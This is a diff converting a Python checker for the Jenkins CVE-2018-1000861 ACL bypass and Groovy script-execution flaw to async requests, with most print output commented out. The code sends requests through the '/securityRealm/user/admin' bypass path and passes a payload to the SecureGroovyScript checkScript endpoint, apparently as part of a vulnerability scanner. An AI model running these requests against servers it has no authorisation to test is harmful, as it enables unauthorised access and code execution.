@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import binascii
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2018_1000861_BaseVerify:
     def __init__(self, url):
@@ -25,7 +25,7 @@ class CVE_2018_1000861_BaseVerify:
             "User-Agent": get_useragent()
         }
 
-    def check_1(self):
+    async def check_1(self):
     
         """
         第一种方式检测是否存在漏洞
@@ -38,15 +38,15 @@ class CVE_2018_1000861_BaseVerify:
         flag, accessible = self.ACL_PATCHED, False
         try:
             # check ANONYMOUS_READ
-            anonymous_read_req = request.get(self.url, headers = self.headers)
-            if anonymous_read_req.status_code == 200 and 'adjuncts' in anonymous_read_req.text:
+            anonymous_read_req = await request.get(self.url, headers = self.headers)
+            if anonymous_read_req.status == 200 and 'adjuncts' in await anonymous_read_req.text():
                 flag, accessible = self.READ_ENABLE, True
                 print('ANONYMOUS_READ enable!')
-            elif anonymous_read_req.status_code == 403:
+            elif anonymous_read_req.status == 403:
                 print('ANONYMOUS_READ disable!')
                 # check ACL bypass, CVE-2018-1000861
-                check_acl_bypass_req = request.get(self.url + '/securityRealm/user/admin', headers = self.headers)
-                if check_acl_bypass_req.status_code == 200 and 'adjuncts' in check_acl_bypass_req.text:
+                check_acl_bypass_req = await request.get(self.url + '/securityRealm/user/admin', headers = self.headers)
+                if check_acl_bypass_req.status == 200 and 'adjuncts' in await check_acl_bypass_req.text():
                     flag, accessible = self.READ_BYPASS, True
             else:
                 flag = self.NOT_JENKINS
@@ -57,17 +57,18 @@ class CVE_2018_1000861_BaseVerify:
                     url = self.url + '/securityRealm/user/admin'
                 else:
                     url = self.url
-                check_entry_req = request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', headers = self.headers)
-                if check_entry_req.status_code == 404:
+                check_entry_req = await request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', headers = self.headers)
+                if check_entry_req.status == 404:
                     flag = self.ENTRY_NOTFOUND
 
         except Exception as e:
-            print(e)
+            # print(e)
+            pass
         finally:
             pass
         return flag
 
-    def check_2(self):
+    async def check_2(self):
         
         """
         第二种方式检测是否存在漏洞
@@ -83,20 +84,14 @@ class CVE_2018_1000861_BaseVerify:
             'value': payload
         }
         try:
-            cmd_req = request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', params = params, headers = self.headers)
-            if cmd_req.status_code == 200:
+            cmd_req = await request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', params = params, headers = self.headers)
+            if cmd_req.status == 200:
                 return True
-            elif cmd_req.status_code == 405:
-                return False
-            else:
-                return False
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -106,32 +101,23 @@ class CVE_2018_1000861_BaseVerify:
         :return bool True or False: 是否存在漏洞
         """
         
-        flag = self.check_1()
+        flag = await self.check_1()
         if flag is self.ACL_PATCHED:
-            print('不存在CVE-2018-1000861漏洞')
+            # print('不存在CVE-2018-1000861漏洞')
             return False
         elif flag is self.NOT_JENKINS:
-            print('不存在CVE-2018-1000861漏洞')
+            # print('不存在CVE-2018-1000861漏洞')
             return False
         elif flag is self.READ_ENABLE:
-            if self.check_2():
-                print('存在CVE-2018-1000861漏洞')
+            if await self.check_2():
+                # print('存在CVE-2018-1000861漏洞')
                 return True
-            else:
-                print('不存在CVE-2018-1000861漏洞')
-                return False
         elif flag is self.READ_BYPASS:
             print('Bypass with CVE-2018-1000861!')
             self.url = self.url + '/securityRealm/user/admin'
-            if self.check_2():
-                print('存在CVE-2018-1000861漏洞')
+            if await self.check_2():
+                # print('存在CVE-2018-1000861漏洞')
                 return True
-            else:
-                print('不存在CVE-2018-1000861漏洞')
-                return False
-        else:
-            print('不存在CVE-2018-1000861漏洞')
-            return False
 
 if __name__ == '__main__':
     CVE_2018_1000861 = CVE_2018_1000861_BaseVerify('http://10.4.69.55:8789')
